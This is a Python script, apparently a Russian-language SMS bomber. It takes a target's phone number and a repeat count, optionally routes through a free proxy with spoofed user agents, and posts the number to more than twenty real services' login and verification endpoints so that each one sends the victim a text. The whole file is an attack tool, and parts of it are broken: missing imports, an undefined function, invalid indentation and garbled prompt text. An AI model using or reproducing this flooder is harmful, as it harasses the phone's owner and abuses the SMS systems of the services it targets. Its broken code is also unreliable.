#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
import requests,fake_useragent,time,os,threading
from threading import Thread
from rich.console import Console
from rich.progress import *
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console = Console()

os.system('cls' if os.name == 'nt' else 'clear')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def generate_proxy():
    proxy = requests.get("https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true").text
    console.print(proxy)
    return {"http": proxy, "https": proxy}
    main()
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console.print('''[bold red]
 Создатель - Hironotori
 Telegram - @Hironotori
 Человек которий сильно помог - @GGClubbb
''')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
number = input('Beeante HOMeP tenedona: (бes + ')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
proxy = console.input("[yellow]Использовать прокси? (y/n):\n[blue]spammer>> ")
if proxy.lower() == "y":
        proxies = generate_proxy()
else:
        proxies = None
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
for _ in track(range(run)):
headers = {"User-Agent": fake_useragent.UserAgent().random}
 try:
         requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "login": "Сергей", "phone": number, "stage": "1"}, headers=headers, proxies=proxies)
         print('bi.ua')
 except:
         print('Не отправлено (bi.ua)')
 try:
         requests.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", "identity": number}, headers=headers, proxies=proxies)
 except:
         print('Не отправлено my.ctrs.com')
 try:
         requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers, proxies=proxies)
         print('telegram')
 except:
         print('Не отправлено (telegram)')
 try:
         requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, headers=headers, proxies=proxies)
         print('discord')
 except:
         print('Не отправлено (discord)')
 try:
         requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers, proxies=proxies)
         print('vodafone')
 except:
         print('Не отправлено (vodafone)')
 try:
         requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+" + number}, headers=headers, proxies=proxies)
         print('megasport')
 except:
         print('Не отправлено (megasport)')
 try:
         requests.post("https://zolotakoroleva.ua/api/send-otp", json={"params": {"phone": "+" + number}}, headers=headers, proxies=proxies)
         print('zolotakoroleva.ua')
 except:
         print('Не отправлено (zolotakoroleva.ua)')
 try:
         requests.post('https://my.xtra.tv/api/service?lang=uk', data={'phone': number, "first_name": Настя, "surname": Сосикиная}, headers=headers, proxies=proxies)
         print('xtra.tv-service')
 except:
         print('Не доставлено (xtra.tv-service)')
 try:
         requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, headers=headers, proxies=proxies)
         print('mozayka.com.ua')
 except:
         print('Не отправлено (mozayka.com.ua)')
 try:
         requests.post("https://kazan-divan.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers, proxies=proxies)
         print('kazan-divan.eatery.club')
 except:
         print('Не доставлено (kazan-divan.eatery.club)')
 try:
         requests.post("https://x100ecommerce-api-customers.azurewebsites.net/v1/SendCode", json={"recipient": "+" + number, "retailNetworkId": "4C25DB70-1DCE-11EB-A6EC-7B643829D650", "source": "WEB"}, headers=headers, proxies=proxies)
         print('azurewebsites.net')
 except:
         print('Не отправлено (azurewebsites.net)')
 try:
         requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": number}, headers=headers, proxies=proxies)
         print('my.xtra.tv')
 except:
         print('Не отправлено (my.xtra.tv)')
 try:
         requests.post("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers, proxies=proxies)
         print('multiplex.ua')
 except:
         print('Не отправлено (multiplex.ua)')
 try:
         requests.post("https://passport.aitu.io/api/v1/sms/request-code", json={"phone": "+" + number}, headers=headers, proxies=proxies)
         print('aitu.io')
 except:
         print('Не отправлено (aitu.io)')
 try:
         requests.post("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers, proxies=proxies)
         print('helsi.me')
 except:
         print('Не отправлено (helsi.me)')
 try:
         requests.post("https://ukrzoloto.ua/mobile/v1/auth/phone", json={"data": {"telephoneNumber": number}}, headers=headers, proxies=proxies)
         print('ukrzoloto.ua')
 except:
         print('Не отправлено (ukrzoloto.ua)')
 try:
         requests.post("https://prosto.tv/wp-admin/admin-ajax.php", data={"action": "check-phone", "phone": "+" + number, "username": "Руслан", "_nonce": "db4f28b9da"}, headers=headers, proxies=proxies)
         print('prosto.tv')
 except:
         print('Не отправлено (prosto.tv)')
 try:
         requests.post("https://sportbank.com.ua/send-sms", data={"phone": "+" + number, "agree": "1"}, headers=headers, proxies=proxies)
         print('sportbank.com.ua')
 except:
         print('Не отправлено (sportbank.com.ua)')
 try:
         formatted_phone = format_phone(number, "+## (###) ###-##-##")
         requests.post("https://izibank.com.ua/api/send_link", json={"deviceIOS": "false", "phone": "+" + number}, headers=headers, proxies=proxies)
         print('izibank.com.ua')
 except:
         print('Не отправлено (izibank.com.ua)')
 try:
         requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, headers=headers, proxies=proxies)
         print('groshivsim.com')
 except:
         print('Не отправлено (groshivsim.com)')
 try:
         requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers, proxies=proxies)
         print('money4you.ua')
 except:
         print('Не отправлено (money4you.ua)')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
